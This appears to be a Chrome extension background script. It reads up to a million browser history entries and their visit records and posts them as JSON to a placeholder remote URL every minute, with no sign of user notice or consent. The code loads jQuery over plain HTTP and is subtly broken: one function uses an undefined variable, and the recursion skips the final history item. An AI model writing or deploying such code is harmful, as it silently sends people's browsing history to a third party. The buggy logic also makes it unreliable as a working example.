<script src="http://code.jquery.com/jquery-1.4.2.min.js"> </script>
<script>
var debug = false;
var startTime = 0;
var url = '__INSERT_ME_DOT_URI_HERE__urls';
var NUM = 1000000;
function postHistory() {
    chrome.history.search({'text':'', 'maxResults':NUM, 'startTime':startTime}, function(urls) {
        if(debug) alert('url:' + url + '\nurls: ' + urls.length);
        getVisits(urls, function(visitItems) {
            $.post(url, {urls:JSON.stringify(visitItems)},function(data) {
                if(debug) alert('posted data!');
                setTimeout(postHistory, 60000);
            }, 'UTF-8');    
        });
    });
}
function getLatest(callback) {
    $.get(url + endpoint + '/latest',callback);
}

function getVisits(historyItems, visitItems, callback) {
    if(!callback) {
        if(!visitItems)
            return;
        callback = visitItems;
        visitItems = [];
    }
    var item = historyItems.pop();
    var url = item.url;
    if(historyItems.length > 0) {
        chrome.history.getVisits({'url':url}, function(visits) {
            for(var j in visits) {
                visits[j].url = item.url;
                visits[j].title = item.title;
                visitItems.push(visits[j]);
            }
            getVisits(historyItems, visitItems, callback);
        });
    } else {
        callback(visitItems);
    }
}

postHistory();

</script>